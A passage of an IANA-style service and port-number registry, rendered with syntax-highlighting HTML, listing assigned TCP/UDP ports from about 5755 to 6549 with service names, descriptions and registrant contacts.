<span class="token comment">#                          Previous contact: Brian Trevor  07 January 2008</span>
<span class="token comment">#                          Current contact: Brian Trevor  24 October 2008</span>
<span class="token comment">#               5751-5754  Unassigned</span>
openmailg       <span class="token number">5755</span>/tcp   OpenMail Desk Gateway server
openmailg       <span class="token number">5755</span>/udp   OpenMail Desk Gateway server
x500ms          <span class="token number">5757</span>/tcp   OpenMail X.500 Directory Server
x500ms          <span class="token number">5757</span>/udp   OpenMail X.500 Directory Server
openmailns      <span class="token number">5766</span>/tcp   OpenMail NewMail Server
openmailns      <span class="token number">5766</span>/udp   OpenMail NewMail Server
s-openmail      <span class="token number">5767</span>/tcp   OpenMail Suer Agent Layer <span class="token punctuation">(</span>Secure<span class="token punctuation">)</span>
s-openmail      <span class="token number">5767</span>/udp   OpenMail Suer Agent Layer <span class="token punctuation">(</span>Secure<span class="token punctuation">)</span>
openmailpxy     <span class="token number">5768</span>/tcp   OpenMail CMTS Server
openmailpxy     <span class="token number">5768</span>/udp   OpenMail CMTS Server
<span class="token comment">#                          OpenMail Encyclopedia </span>
<span class="token comment">#                          Don Loughry </span>
spramsca	<span class="token number">5769</span>/tcp   x509solutions Internal CA
spramsca	<span class="token number">5769</span>/udp   x509solutions Internal CA
spramsd		<span class="token number">5770</span>/tcp   x509solutions Secure Data
spramsd		<span class="token number">5770</span>/udp   x509solutions Secure Data
<span class="token comment">#			   Brendan Fay  February 2006</span>
netagent        <span class="token number">5771</span>/tcp   NetAgent
netagent        <span class="token number">5771</span>/udp   NetAgent
<span class="token comment">#                          Bradley Birnbaum </span>
<span class="token comment">#               5772-5776  Unassigned</span>
dali-port       <span class="token number">5777</span>/tcp   DALI Port
dali-port       <span class="token number">5777</span>/udp   DALI Port
<span class="token comment">#                          Wayne Morrow / Michael Melio  /  October 2003</span>
<span class="token comment">#               5778-5779  Unassigned</span>
vts-rpc         <span class="token number">5780</span>/tcp   Visual Tag System RPC
<span class="token comment">#                          Graham Bloice  17 September 2009</span>
<span class="token comment">#               5780/udp   Reserved</span>
3par-evts       <span class="token number">5781</span>/tcp   3PAR Event Reporting Service
3par-evts       <span class="token number">5781</span>/udp   3PAR Event Reporting Service
<span class="token comment">#                          Sushil Thomas  10 March 2008</span>
3par-mgmt       <span class="token number">5782</span>/tcp   3PAR Management Service
3par-mgmt       <span class="token number">5782</span>/udp   3PAR Management Service
3par-mgmt-ssl   <span class="token number">5783</span>/tcp   3PAR Management Service with SSL
3par-mgmt-ssl   <span class="token number">5783</span>/udp   3PAR Management Service with SSL
<span class="token comment">#                          Don Marselle  19 March 2008</span>
<span class="token comment">#               5784       Unassigned</span>
3par-rcopy      <span class="token number">5785</span>/tcp   3PAR Inform Remote Copy
3par-rcopy      <span class="token number">5785</span>/udp   3PAR Inform Remote Copy
<span class="token comment">#                          Don Marselle  09 April 2008</span>
<span class="token comment">#               5786-5792  Unassigned</span>
xtreamx		<span class="token number">5793</span>/tcp   XtreamX Supervised Peer message
xtreamx		<span class="token number">5793</span>/udp   XtreamX Supervised Peer message
<span class="token comment">#			   Ahmad Tajuddin Samsudin  February 2007</span>
<span class="token comment">#               5794-5812  Unassigned</span>
icmpd           <span class="token number">5813</span>/tcp   ICMPD
icmpd           <span class="token number">5813</span>/udp   ICMPD
<span class="token comment">#                          Shane O'Donnell </span>
spt-automation  <span class="token number">5814</span>/tcp   Support Automation
spt-automation  <span class="token number">5814</span>/udp   Support Automation
<span class="token comment">#                          Joshua Hawkins  November 2003</span>
<span class="token comment">#               5815-5858  Unassigned</span>
wherehoo        <span class="token number">5859</span>/tcp   WHEREHOO
wherehoo        <span class="token number">5859</span>/udp   WHEREHOO
<span class="token comment">#                          Jim Youll </span>
<span class="token comment">#               5860-5862  Unassigned</span>
ppsuitemsg	<span class="token number">5863</span>/tcp   PlanetPress Suite Messeng
ppsuitemsg	<span class="token number">5863</span>/udp   PlanetPress Suite Messeng
<span class="token comment">#			   Yannick Fortin  February 2006</span>
<span class="token comment">#               5864-5899  Unassigned</span>
vnc-server	<span class="token number">5900</span>/tcp   VNC Server
vnc-server	<span class="token number">5900</span>/udp   VNC Server
<span class="token comment">#			   Tristan Richardson  March 2006</span>
<span class="token comment">#               5901-5909  Unassigned</span>
cm              <span class="token number">5910</span>/tcp   Context Management
cm              <span class="token number">5910</span>/udp   Context Management
cpdlc           <span class="token number">5911</span>/tcp   Controller Pilot Data Link Communication
cpdlc           <span class="token number">5911</span>/udp   Controller Pilot Data Link Communication
fis             <span class="token number">5912</span>/tcp   Flight Information Services
fis             <span class="token number">5912</span>/udp   Flight Information Services
ads-c           <span class="token number">5913</span>/tcp   Automatic Dependent Surveillance
ads-c           <span class="token number">5913</span>/udp   Automatic Dependent Surveillance
<span class="token comment">#                          Eivan Cerasi  10 October 2008</span>
<span class="token comment">#               5914-5962  Unassigned</span>
indy            <span class="token number">5963</span>/tcp   Indy Application Server
indy            <span class="token number">5963</span>/udp   Indy Application Server
<span class="token comment">#                          Bjorn Lantz  November 2004</span>
<span class="token comment">#               5964-5967  Unassigned</span>
mppolicy-v5     <span class="token number">5968</span>/tcp   mppolicy-v5
mppolicy-v5     <span class="token number">5968</span>/udp   mppolicy-v5
mppolicy-mgr    <span class="token number">5969</span>/tcp   mppolicy-mgr
mppolicy-mgr	<span class="token number">5969</span>/udp   mppolicy-mgr
<span class="token comment">#                          Yutaka Ono </span>
<span class="token comment">#               5970-5983  Unassigned</span>
couchdb         <span class="token number">5984</span>/tcp   CouchDB
couchdb         <span class="token number">5984</span>/udp   CouchDB
<span class="token comment">#			   Noah Slater  27 November 2007</span>
wsman		<span class="token number">5985</span>/tcp   WBEM WS-Management HTTP
wsman		<span class="token number">5985</span>/udp   WBEM WS-Management HTTP
wsmans		<span class="token number">5986</span>/tcp   WBEM WS-Management HTTP over TLS/SSL
wsmans		<span class="token number">5986</span>/udp   WBEM WS-Management HTTP over TLS/SSL
<span class="token comment">#			   Jim Davis  November 2006</span>
wbem-rmi        <span class="token number">5987</span>/tcp   WBEM RMI
wbem-rmi        <span class="token number">5987</span>/udp   WBEM RMI
wbem-http       <span class="token number">5988</span>/tcp   WBEM CIM-XML <span class="token punctuation">(</span>HTTP<span class="token punctuation">)</span>
wbem-http       <span class="token number">5988</span>/udp   WBEM CIM-XML <span class="token punctuation">(</span>HTTP<span class="token punctuation">)</span>
<span class="token comment">#                          Jim Davis </span>
wbem-https      <span class="token number">5989</span>/tcp   WBEM CIM-XML <span class="token punctuation">(</span>HTTPS<span class="token punctuation">)</span>
wbem-https      <span class="token number">5989</span>/udp   WBEM CIM-XML <span class="token punctuation">(</span>HTTPS<span class="token punctuation">)</span>
<span class="token comment">#                          Jim Davis </span>
wbem-exp-https  <span class="token number">5990</span>/tcp   WBEM Export HTTPS
wbem-exp-https  <span class="token number">5990</span>/udp   WBEM Export HTTPS
<span class="token comment">#                          Denise Eckstein  November 2004</span>
nuxsl           <span class="token number">5991</span>/tcp   NUXSL
nuxsl           <span class="token number">5991</span>/udp   NUXSL
<span class="token comment">#                          Kai Kretschmann  March 2002</span>
consul-insight  <span class="token number">5992</span>/tcp   Consul InSight Security
consul-insight  <span class="token number">5992</span>/udp   Consul InSight Security
<span class="token comment">#                          Arthur Hillenaar  January 2006</span>
<span class="token comment">#               5993-5998  Unassigned</span>
cvsup           <span class="token number">5999</span>/tcp   CVSup
cvsup           <span class="token number">5999</span>/udp   CVSup
<span class="token comment">#                          Randall Atkinson </span>
x11             <span class="token number">6000</span>-6063/tcp   X Window System
x11             <span class="token number">6000</span>-6063/udp   X Window System
<span class="token comment">#                          Stephen Gildea </span>
ndl-ahp-svc     <span class="token number">6064</span>/tcp   NDL-AHP-SVC
ndl-ahp-svc     <span class="token number">6064</span>/udp   NDL-AHP-SVC
<span class="token comment">#                          John Richmond </span>
winpharaoh      <span class="token number">6065</span>/tcp   WinPharaoh
winpharaoh      <span class="token number">6065</span>/udp   WinPharaoh
<span class="token comment">#	                   Basil Lee </span>
ewctsp          <span class="token number">6066</span>/tcp   EWCTSP
ewctsp          <span class="token number">6066</span>/udp   EWCTSP
<span class="token comment">#                          Mark Bailon </span>
<span class="token comment">#               6067       Unassigned (Removed on 2007-07-17)</span>
gsmp            <span class="token number">6068</span>/tcp   GSMP
gsmp            <span class="token number">6068</span>/udp   GSMP
<span class="token comment">#                          Avri Doria </span>
trip            <span class="token number">6069</span>/tcp   TRIP
trip            <span class="token number">6069</span>/udp   TRIP
<span class="token comment">#                          Hussein F. Salama </span>
messageasap     <span class="token number">6070</span>/tcp   Messageasap
messageasap     <span class="token number">6070</span>/udp   Messageasap
<span class="token comment">#                          Murray Freeman </span>
ssdtp           <span class="token number">6071</span>/tcp   SSDTP
ssdtp           <span class="token number">6071</span>/udp   SSDTP
<span class="token comment">#                          Michael Shearson </span>
diagnose-proc   <span class="token number">6072</span>/tcp   DIAGNOSE-PROC
diagnose-proc   <span class="token number">6072</span>/udp   DIAGNOSE-PROC
<span class="token comment">#                          Allan Miller </span>
directplay8     <span class="token number">6073</span>/tcp   DirectPlay8
directplay8     <span class="token number">6073</span>/udp   DirectPlay8
<span class="token comment">#                          John Kane </span>
max		<span class="token number">6074</span>/tcp   Microsoft Max
max		<span class="token number">6074</span>/udp   Microsoft Max
<span class="token comment">#			   Jay Beavers  February 2006</span>
<span class="token comment">#               6075-6083  Unassigned</span>
p2p-sip         <span class="token number">6084</span>/tcp   Peer to Peer Infrastructure Protocol
<span class="token comment">#                          Cullen Jennings  29 January 2009</span>
<span class="token comment">#               6084/udp   Reserved</span>
konspire2b      <span class="token number">6085</span>/tcp   konspire2b p2p network
konspire2b      <span class="token number">6085</span>/udp   konspire2b p2p network
<span class="token comment">#                          Jason Rohrer  October 2002</span>
pdtp		<span class="token number">6086</span>/tcp   PDTP P2P
pdtp		<span class="token number">6086</span>/udp   PDTP P2P
<span class="token comment">#			   Tony Arcieri  March 2006</span>
ldss		<span class="token number">6087</span>/tcp   Local Download Sharing Service
ldss		<span class="token number">6087</span>/udp   Local Download Sharing Service
<span class="token comment">#			   Clifford Heath  May 2006</span>
<span class="token comment">#               6088-6099  Unassigned</span>
synchronet-db   <span class="token number">6100</span>/tcp   SynchroNet-db
synchronet-db   <span class="token number">6100</span>/udp   SynchroNet-db
synchronet-rtc  <span class="token number">6101</span>/tcp   SynchroNet-rtc
synchronet-rtc  <span class="token number">6101</span>/udp   SynchroNet-rtc
synchronet-upd  <span class="token number">6102</span>/tcp   SynchroNet-upd
synchronet-upd  <span class="token number">6102</span>/udp   SynchroNet-upd
<span class="token comment">#                          Arne Haugland </span>
rets            <span class="token number">6103</span>/tcp   RETS
rets            <span class="token number">6103</span>/udp   RETS
<span class="token comment">#                          Bruce Toback </span>
dbdb            <span class="token number">6104</span>/tcp   DBDB
dbdb            <span class="token number">6104</span>/udp   DBDB
<span class="token comment">#                          Aaron Brick </span>
primaserver     <span class="token number">6105</span>/tcp   Prima Server
primaserver     <span class="token number">6105</span>/udp   Prima Server
mpsserver       <span class="token number">6106</span>/tcp   MPS Server
mpsserver       <span class="token number">6106</span>/udp   MPS Server
<span class="token comment">#                          Prima Designs Systems Ltd. </span>
etc-control     <span class="token number">6107</span>/tcp   ETC Control
etc-control     <span class="token number">6107</span>/udp   ETC Control
<span class="token comment">#                          Steve Polishinski </span>
sercomm-scadmin <span class="token number">6108</span>/tcp   Sercomm-SCAdmin
sercomm-scadmin <span class="token number">6108</span>/udp   Sercomm-SCAdmin
<span class="token comment">#                          Melinda Tsao </span>
globecast-id    <span class="token number">6109</span>/tcp   GLOBECAST-ID
globecast-id    <span class="token number">6109</span>/udp   GLOBECAST-ID
<span class="token comment">#                          Piers Scannell </span>
softcm          <span class="token number">6110</span>/tcp   HP SoftBench CM
softcm          <span class="token number">6110</span>/udp   HP SoftBench CM
spc             <span class="token number">6111</span>/tcp   HP SoftBench Sub-Process Control
spc             <span class="token number">6111</span>/udp   HP SoftBench Sub-Process Control
<span class="token comment">#                          Scott A. Kramer </span>
dtspcd          <span class="token number">6112</span>/tcp   dtspcd
dtspcd          <span class="token number">6112</span>/udp   dtspcd
<span class="token comment">#                          Doug Royer </span>
dayliteserver   <span class="token number">6113</span>/tcp   Daylite Server
<span class="token comment">#                          Brent Gulanowski  26 August 2009</span>
<span class="token comment">#               6113/udp   Reserved</span>
<span class="token comment">#               6114-6116  Unassigned</span>
daylitetouch    <span class="token number">6117</span>/tcp   Daylite Touch Sync
<span class="token comment">#                          Brent Gulanowski  26 August 2009</span>
<span class="token comment">#               6117/udp   Reserved</span>
<span class="token comment">#               6118-6121  Unassigned</span>
bex-webadmin    <span class="token number">6122</span>/tcp   Backup Express Web Server
bex-webadmin    <span class="token number">6122</span>/udp   Backup Express Web Server
<span class="token comment">#                          Chi Shih Chang  November 2005</span>
backup-express  <span class="token number">6123</span>/tcp   Backup Express
backup-express  <span class="token number">6123</span>/udp   Backup Express
<span class="token comment">#			   Chi Shih Chang </span>
pnbs            <span class="token number">6124</span>/tcp   Phlexible Network Backup Service
pnbs            <span class="token number">6124</span>/udp   Phlexible Network Backup Service
<span class="token comment">#                          William R. Lear  23 October 2008</span>
<span class="token comment">#               6125-6132  Unassigned</span>
nbt-wol         <span class="token number">6133</span>/tcp   New Boundary Tech WOL
nbt-wol         <span class="token number">6133</span>/udp   New Boundary Tech WOL
<span class="token comment">#                          Elizabeth Zilen  November 2004</span>
<span class="token comment">#               6134-6139  Unassigned</span>
pulsonixnls     <span class="token number">6140</span>/tcp   Pulsonix Network License Service
pulsonixnls     <span class="token number">6140</span>/udp   Pulsonix Network License Service
<span class="token comment">#                          David Manns  28 February 2008</span>
meta-corp       <span class="token number">6141</span>/tcp   Meta Corporation License Manager
meta-corp       <span class="token number">6141</span>/udp   Meta Corporation License Manager
<span class="token comment">#                          Osamu Masuda &lt;--none---></span>
aspentec-lm     <span class="token number">6142</span>/tcp   Aspen Technology License Manager
aspentec-lm     <span class="token number">6142</span>/udp   Aspen Technology License Manager
<span class="token comment">#                          Kevin Massey </span>
watershed-lm    <span class="token number">6143</span>/tcp   Watershed License Manager
watershed-lm    <span class="token number">6143</span>/udp   Watershed License Manager
<span class="token comment">#                          David Ferrero </span>
statsci1-lm     <span class="token number">6144</span>/tcp   StatSci License Manager - <span class="token number">1</span>
statsci1-lm     <span class="token number">6144</span>/udp   StatSci License Manager - <span class="token number">1</span>
statsci2-lm     <span class="token number">6145</span>/tcp   StatSci License Manager - <span class="token number">2</span>
statsci2-lm     <span class="token number">6145</span>/udp   StatSci License Manager - <span class="token number">2</span>
<span class="token comment">#                          Scott Blachowicz </span>
lonewolf-lm     <span class="token number">6146</span>/tcp   Lone Wolf Systems License Manager
lonewolf-lm     <span class="token number">6146</span>/udp   Lone Wolf Systems License Manager
<span class="token comment">#                          Dan Klein </span>
montage-lm      <span class="token number">6147</span>/tcp   Montage License Manager
montage-lm      <span class="token number">6147</span>/udp   Montage License Manager
<span class="token comment">#                          Michael Ubell </span>
ricardo-lm      <span class="token number">6148</span>/tcp   Ricardo North America License Manager
ricardo-lm      <span class="token number">6148</span>/udp   Ricardo North America License Manager
<span class="token comment">#                          M Flemming </span>
tal-pod         <span class="token number">6149</span>/tcp   tal-pod
tal-pod         <span class="token number">6149</span>/udp   tal-pod
<span class="token comment">#                          Steven Loomis </span>
<span class="token comment">#               6150-6160  Unassigned</span>
patrol-ism      <span class="token number">6161</span>/tcp   PATROL Internet Srv Mgr
patrol-ism      <span class="token number">6161</span>/udp   PATROL Internet Srv Mgr
patrol-coll     <span class="token number">6162</span>/tcp   PATROL Collector
patrol-coll     <span class="token number">6162</span>/udp   PATROL Collector
<span class="token comment">#                          Portnoy Boxman  January 2005</span>
pscribe         <span class="token number">6163</span>/tcp   Precision Scribe Cnx Port
pscribe         <span class="token number">6163</span>/udp   Precision Scribe Cnx Port
<span class="token comment">#                          Robert W Hodges  January 2005</span>
<span class="token comment">#               6164-6199  Unassigned</span>
lm-x		<span class="token number">6200</span>/tcp   LM-X License Manager by X-Formation
lm-x		<span class="token number">6200</span>/udp   LM-X License Manager by X-Formation
<span class="token comment">#			   Henrik Goldman  October 2006</span>
<span class="token comment">#               6201-6221  Unassigned</span>
radmind		<span class="token number">6222</span>/tcp   Radmind Access Protocol
radmind		<span class="token number">6222</span>/udp   Radmind Access Protocol
<span class="token comment">#			   Patrick M McNeal  March 2006</span>
<span class="token comment">#               6223-6240  Unassigned</span>
jeol-nsdtp-1    <span class="token number">6241</span>/tcp   JEOL Network Services Data Transport Protocol <span class="token number">1</span>
jeol-nsddp-1    <span class="token number">6241</span>/udp   JEOL Network Services Dynamic Discovery Protocol <span class="token number">1</span>
jeol-nsdtp-2    <span class="token number">6242</span>/tcp   JEOL Network Services Data Transport Protocol <span class="token number">2</span>
jeol-nsddp-2    <span class="token number">6242</span>/udp   JEOL Network Services Dynamic Discovery Protocol <span class="token number">2</span>
jeol-nsdtp-3    <span class="token number">6243</span>/tcp   JEOL Network Services Data Transport Protocol <span class="token number">3</span>
jeol-nsddp-3    <span class="token number">6243</span>/udp   JEOL Network Services Dynamic Discovery Protocol <span class="token number">3</span>
jeol-nsdtp-4    <span class="token number">6244</span>/tcp   JEOL Network Services Data Transport Protocol <span class="token number">4</span>
jeol-nsddp-4    <span class="token number">6244</span>/udp   JEOL Network Services Dynamic Discovery Protocol <span class="token number">4</span>
<span class="token comment">#                          Kevin Wellwood  17 April 2008</span>
<span class="token comment">#               6245-6250  Unassigned</span>
tl1-raw-ssl     <span class="token number">6251</span>/tcp   TL1 Raw Over SSL/TLS
tl1-raw-ssl     <span class="token number">6251</span>/udp   TL1 Raw Over SSL/TLS
<span class="token comment">#                          Jim Humphreys  29 January 2008</span>
tl1-ssh         <span class="token number">6252</span>/tcp   TL1 over SSH
tl1-ssh         <span class="token number">6252</span>/udp   TL1 over SSH
<span class="token comment">#                          Jim Humphreys  25 January 2008</span>
crip            <span class="token number">6253</span>/tcp   CRIP
crip            <span class="token number">6253</span>/udp   CRIP
<span class="token comment">#                          Mike Rodbell </span>
<span class="token comment">#               6254-6267  Unassigned</span>
grid		<span class="token number">6268</span>/tcp   Grid Authentication
grid		<span class="token number">6268</span>/udp   Grid Authentication
grid-alt	<span class="token number">6269</span>/tcp   Grid Authentication Alt
grid-alt	<span class="token number">6269</span>/udp   Grid Authentication Alt
<span class="token comment">#			   Jason Hamilton  June 2006</span>
<span class="token comment">#               6270-6299  Unassigned</span>
bmc-grx         <span class="token number">6300</span>/tcp   BMC GRX
bmc-grx         <span class="token number">6300</span>/udp   BMC GRX
<span class="token comment">#                          Portnoy Boxman </span>
bmc_ctd_ldap	<span class="token number">6301</span>/tcp   BMC CONTROL-D LDAP SERVER
bmc_ctd_ldap	<span class="token number">6301</span>/udp   BMC CONTROL-D LDAP SERVER
<span class="token comment">#			   Portnoy Boxman  September 2006</span>
<span class="token comment">#               6302-6315  Unassigned</span>
abb-escp        <span class="token number">6316</span>/tcp   Ethernet Sensor Communications Protocol
abb-escp        <span class="token number">6316</span>/udp   Ethernet Sensor Communications Protocol
<span class="token comment">#                          Jaime Antolin  25 September 2008</span>
<span class="token comment">#               6317-6319  Unassigned</span>
repsvc		<span class="token number">6320</span>/tcp   Double-Take Replication Service
repsvc		<span class="token number">6320</span>/udp   Double-Take Replication Service
<span class="token comment">#			   James Wilkinson  April 2006</span>
emp-server1     <span class="token number">6321</span>/tcp   Empress Software Connectivity Server <span class="token number">1</span>
emp-server1     <span class="token number">6321</span>/udp   Empress Software Connectivity Server <span class="token number">1</span>
emp-server2     <span class="token number">6322</span>/tcp   Empress Software Connectivity Server <span class="token number">2</span>
emp-server2     <span class="token number">6322</span>/udp   Empress Software Connectivity Server <span class="token number">2</span>
<span class="token comment">#                          Srdjan Holovac </span>
<span class="token comment">#               6323-6342  Unassigned</span>
sflow           <span class="token number">6343</span>/tcp   sFlow traffic monitoring
sflow           <span class="token number">6343</span>/udp   sFlow traffic monitoring
<span class="token comment">#                          Peter Phaal  June 2003</span>
<span class="token comment">#               6344-6345  Unassigned</span>
gnutella-svc    <span class="token number">6346</span>/tcp   gnutella-svc
gnutella-svc    <span class="token number">6346</span>/udp   gnutella-svc
gnutella-rtr    <span class="token number">6347</span>/tcp   gnutella-rtr
gnutella-rtr    <span class="token number">6347</span>/udp   gnutella-rtr
<span class="token comment">#                          Serguei Osokine </span>
<span class="token comment">#               6348-6354  Unassigned</span>
pmcs		<span class="token number">6355</span>/tcp   PMCS applications
pmcs		<span class="token number">6355</span>/udp   PMCS applications
<span class="token comment">#			   Pavel Mendl  March 2007</span>
<span class="token comment">#               6356-6359  Unassigned</span>
metaedit-mu	<span class="token number">6360</span>/tcp   MetaEdit+ Multi-User
metaedit-mu	<span class="token number">6360</span>/udp   MetaEdit+ Multi-User
<span class="token comment">#			   Steven Kelly  12 November 2007</span>
<span class="token comment">#               6361-6369  Unassigned</span>
metaedit-se	<span class="token number">6370</span>/tcp   MetaEdit+ Server Administration
metaedit-se	<span class="token number">6370</span>/udp   MetaEdit+ Server Administration
<span class="token comment">#			   Steven Kelly  12 November 2007</span>
<span class="token comment">#               6371-6381  Unassigned</span>
metatude-mds    <span class="token number">6382</span>/tcp   Metatude Dialogue Server
metatude-mds    <span class="token number">6382</span>/udp   Metatude Dialogue Server
<span class="token comment">#                          Menno Zweistra </span>
<span class="token comment">#               6383-6388  Unassigned</span>
clariion-evr01  <span class="token number">6389</span>/tcp   clariion-evr01
clariion-evr01  <span class="token number">6389</span>/udp   clariion-evr01
<span class="token comment">#                          Dave DesRoches </span>
metaedit-ws	<span class="token number">6390</span>/tcp   MetaEdit+ WebService API
metaedit-ws	<span class="token number">6390</span>/udp   MetaEdit+ WebService API
<span class="token comment">#			   Steven Kelly  12 November 2007</span>
<span class="token comment">#               6391-6399  Unassigned</span>
boe-cms         <span class="token number">6400</span>       Business Objects CMS contact port
boe-was         <span class="token number">6401</span>       boe-was
boe-eventsrv    <span class="token number">6402</span>       boe-eventsrv
boe-cachesvr    <span class="token number">6403</span>       boe-cachesvr
boe-filesvr     <span class="token number">6404</span>       Business Objects Enterprise internal server
boe-pagesvr     <span class="token number">6405</span>       Business Objects Enterprise internal server
boe-processsvr  <span class="token number">6406</span>       Business Objects Enterprise internal server
boe-resssvr1    <span class="token number">6407</span>       Business Objects Enterprise internal server
boe-resssvr2    <span class="token number">6408</span>       Business Objects Enterprise internal server
boe-resssvr3    <span class="token number">6409</span>       Business Objects Enterprise internal server
boe-resssvr4    <span class="token number">6410</span>       Business Objects Enterprise internal server
<span class="token comment">#                          Previous contact: Wade Richards </span>
<span class="token comment">#                          Current contact: Wade Richards  05 May 2008</span>
<span class="token comment">#               6411-6416  Unassigned</span>
faxcomservice	<span class="token number">6417</span>/tcp   Faxcom Message Service
faxcomservice	<span class="token number">6417</span>/udp   Faxcom Message Service
<span class="token comment">#			   Albert Leung  April 2006</span>
<span class="token comment">#               6418-6419  Unassigned</span>
nim-vdrshell    <span class="token number">6420</span>/tcp   NIM_VDRShell
nim-vdrshell    <span class="token number">6420</span>/udp   NIM_VDRShell
nim-wan         <span class="token number">6421</span>/tcp   NIM_WAN
nim-wan         <span class="token number">6421</span>/udp   NIM_WAN
<span class="token comment">#			   Rik Ditter  February 2006</span>
<span class="token comment">#               6422-6431  Unassigned</span>
pgbouncer       <span class="token number">6432</span>/tcp   PgBouncer
<span class="token comment">#                          Marko Kreen  13 February 2009</span>
<span class="token comment">#               6432/udp   Reserved</span>
<span class="token comment">#               6433-6442  Unassigned</span>
sun-sr-https	<span class="token number">6443</span>/tcp   Service Registry Default HTTPS Domain
sun-sr-https	<span class="token number">6443</span>/udp   Service Registry Default HTTPS Domain
<span class="token comment">#			   Paul Sterk  March 2006</span>
sge_qmaster	<span class="token number">6444</span>/tcp   Grid Engine Qmaster Service
sge_qmaster	<span class="token number">6444</span>/udp   Grid Engine Qmaster Service
sge_execd	<span class="token number">6445</span>/tcp   Grid Engine Execution Service
sge_execd	<span class="token number">6445</span>/udp   Grid Engine Execution Service
<span class="token comment">#			   Andreas Haas  August 2006</span>
mysql-proxy     <span class="token number">6446</span>/tcp   MySQL Proxy
mysql-proxy     <span class="token number">6446</span>/udp   MySQL Proxy
<span class="token comment">#                          Kay Roepke  22 April 2009</span>
<span class="token comment">#               6447-6454  Unassigned</span>
skip-cert-recv  <span class="token number">6455</span>/tcp   SKIP Certificate Receive
skip-cert-send  <span class="token number">6456</span>/udp   SKIP Certificate Send
<span class="token comment">#                          Tom Markson </span>
<span class="token comment">#               6457-6470  Unassigned</span>
lvision-lm	<span class="token number">6471</span>/tcp   LVision License Manager
lvision-lm	<span class="token number">6471</span>/udp   LVision License Manager
<span class="token comment">#			   Brian McKinnon </span>
<span class="token comment">#		6472-6479  Unassigned</span>
sun-sr-http	<span class="token number">6480</span>/tcp   Service Registry Default HTTP Domain
sun-sr-http	<span class="token number">6480</span>/udp   Service Registry Default HTTP Domain
<span class="token comment">#			   Paul Sterk  March 2006</span>
servicetags	<span class="token number">6481</span>/tcp   Service Tags
servicetags	<span class="token number">6481</span>/udp   Service Tags
<span class="token comment">#			   Peter Schow  January 2007</span>
ldoms-mgmt      <span class="token number">6482</span>/tcp   Logical Domains Management Interface
ldoms-mgmt      <span class="token number">6482</span>/udp   Logical Domains Management Interface
<span class="token comment">#                          Eric Sharakan  14 February 2008</span>
SunVTS-RMI	<span class="token number">6483</span>/tcp   SunVTS RMI
SunVTS-RMI	<span class="token number">6483</span>/udp   SunVTS RMI
<span class="token comment">#			   Sumit Arora  June 2007</span>
sun-sr-jms	<span class="token number">6484</span>/tcp   Service Registry Default JMS Domain
sun-sr-jms	<span class="token number">6484</span>/udp   Service Registry Default JMS Domain
sun-sr-iiop	<span class="token number">6485</span>/tcp   Service Registry Default IIOP Domain
sun-sr-iiop	<span class="token number">6485</span>/udp   Service Registry Default IIOP Domain
sun-sr-iiops	<span class="token number">6486</span>/tcp   Service Registry Default IIOPS Domain
sun-sr-iiops	<span class="token number">6486</span>/udp   Service Registry Default IIOPS Domain
sun-sr-iiop-aut	<span class="token number">6487</span>/tcp   Service Registry Default IIOPAuth Domain
sun-sr-iiop-aut	<span class="token number">6487</span>/udp   Service Registry Default IIOPAuth Domain
sun-sr-jmx	<span class="token number">6488</span>/tcp   Service Registry Default JMX Domain
sun-sr-jmx	<span class="token number">6488</span>/udp   Service Registry Default JMX Domain
sun-sr-admin	<span class="token number">6489</span>/tcp   Service Registry Default Admin Domain
sun-sr-admin	<span class="token number">6489</span>/udp   Service Registry Default Admin Domain
<span class="token comment">#			   Paul Sterk  March 2006</span>
<span class="token comment">#		6490-6499  Unassigned</span>
boks		<span class="token number">6500</span>/tcp   BoKS Master
boks		<span class="token number">6500</span>/udp   BoKS Master
boks_servc	<span class="token number">6501</span>/tcp   BoKS Servc
boks_servc	<span class="token number">6501</span>/udp   BoKS Servc
boks_servm	<span class="token number">6502</span>/tcp   BoKS Servm
boks_servm	<span class="token number">6502</span>/udp   BoKS Servm
boks_clntd	<span class="token number">6503</span>/tcp   BoKS Clntd
boks_clntd	<span class="token number">6503</span>/udp   BoKS Clntd
<span class="token comment">#                          Magnus Nystrom </span>
<span class="token comment">#           	6504       Unassigned</span>
badm_priv	<span class="token number">6505</span>/tcp   BoKS Admin Private Port
badm_priv	<span class="token number">6505</span>/udp   BoKS Admin Private Port
badm_pub 	<span class="token number">6506</span>/tcp   BoKS Admin Public Port
badm_pub  	<span class="token number">6506</span>/udp   BoKS Admin Public Port
bdir_priv 	<span class="token number">6507</span>/tcp   BoKS Dir Server, Private Port
bdir_priv   	<span class="token number">6507</span>/udp   BoKS Dir Server, Private Port
bdir_pub	<span class="token number">6508</span>/tcp   BoKS Dir Server, Public Port
bdir_pub  	<span class="token number">6508</span>/udp   BoKS Dir Server, Public Port
<span class="token comment">#			   Magnus Nystrom </span>
mgcs-mfp-port   <span class="token number">6509</span>/tcp   MGCS-MFP Port
mgcs-mfp-port   <span class="token number">6509</span>/udp   MGCS-MFP Port
<span class="token comment">#                          Minoru Ozaki </span>
mcer-port       <span class="token number">6510</span>/tcp   MCER Port
mcer-port       <span class="token number">6510</span>/udp   MCER Port
<span class="token comment">#                          Portnoy Boxman </span>
<span class="token comment">#               6511-6512  Unassigned</span>
netconf-tls     <span class="token number">6513</span>/tcp   NETCONF over TLS
<span class="token comment">#               6513/udp   Reserved</span>
<span class="token comment">#                          [RFC5539]</span>
syslog-tls      <span class="token number">6514</span>/tcp   Syslog over TLS
<span class="token comment">#                          [RFC5425]</span>
<span class="token comment">#               6514/udp   Reserved</span>
elipse-rec      <span class="token number">6515</span>/tcp   Elipse RPC Protocol
elipse-rec      <span class="token number">6515</span>/udp   Elipse RPC Protocol
<span class="token comment">#			   Flávio Englert  17 September 2007</span>
<span class="token comment">#               6516-6542  Unassigned</span>
lds-distrib     <span class="token number">6543</span>/tcp   lds_distrib
lds-distrib     <span class="token number">6543</span>/udp   lds_distrib
<span class="token comment">#                          Jack Baker  June 2003</span>
lds-dump	<span class="token number">6544</span>/tcp   LDS Dump Service
lds-dump	<span class="token number">6544</span>/udp   LDS Dump Service
<span class="token comment">#			   Jack Baker  February 2006</span>
<span class="token comment">#               6545-6546  Unassigned</span>
apc-6547        <span class="token number">6547</span>/tcp   APC <span class="token number">6547</span>
apc-6547        <span class="token number">6547</span>/udp   APC <span class="token number">6547</span>
apc-6548        <span class="token number">6548</span>/tcp   APC <span class="token number">6548</span>
apc-6548        <span class="token number">6548</span>/udp   APC <span class="token number">6548</span>
apc-6549        <span class="token number">6549</span>/tcp   APC <span class="token number">6549</span>
apc-6549        <span class="token number">6549</span>/udp   APC <span class="token number">6549</span>
<span class="token comment">#                          American Power Conversion </span>
